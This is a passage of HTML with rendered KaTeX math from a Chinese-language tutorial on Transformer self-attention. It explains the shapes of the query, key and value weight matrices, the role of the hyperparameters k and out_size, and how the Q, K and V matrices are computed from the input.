style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。它们的形状设计如下：</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的形状均为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(embed\_size, k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span></span>。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(embed\_size, out\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span>。</li>
</ul>
<p>这里出现了两个可调参数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>。</p>
<ul>
<li><strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span></strong> 决定了输出矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span> 的特征维度。在标准 Transformer 中，为了便于残差连接和层标准化等操作，通常令 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>=</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size = embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>，即保持输入输出维度一致。</li>
<li>而<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span><strong>是一个需要精心设计而非随意指定的关键超参数</strong>。它决定了注意力匹配过程的“特征分辨率”或“比较深度”。你可以将其理解为在计算注意力时，模型用于比对Query和Key的“特征专精度”。较大的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 意味着模型可以使用更丰富的特征进行精细匹配，但也可能带来过拟合风险；较小的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 则迫使模型学习更泛化、更精简的匹配模式。这个维度的选择，本质上是在<strong>模型表达力与计算效率之间寻求平衡</strong>，它如同摄影中的“对焦精度”——并非越高越好，而是要适配任务的需求。暂且搁置不谈。</li>
</ul>
<p>有了这些权重矩阵，我们便可以一次性为整个序列生成其对应的查询（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>）、键（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span>）和值（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span>）矩阵：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>q</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>k</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>V</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>v</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{matrix}
Q = X\cdot W_{q} &amp; (seq\_len,k)
 \\
K = X\cdot W_{k} &amp; (seq\_len,k)
 \\
V = X\cdot W_{v} &amp; (seq\_len,out\_size) 
\end{matrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<p>这样一来，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>中的每一个向量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 便通过三个独立的线性变换被“拆分”成了<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^q,x_i^k,x_i^v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.126em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span></span></span></span></span>，其中<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo>=</mo><mi>Q</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup><mo>=</mo><mi>K</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup><mo>=</mo><mi>V</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">x_{i}^{q}= Q[i],x_{i}^{k}= K[i],x_{i}^{v}= V[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1078em;vertical-align:-0.2587em;"/><span class="mord mathnormal">Q</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0087em;vertical-align:-0.2587em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span></p>
<p>接下来，我们计算注意力权重。核心思想是计算每一对 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>j</mi><mi>k</mi></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x^q_i, x^k_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2439em;vertical-align:-0.3948em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> 的相似度，这可以通过矩阵乘法高效完成。</p>
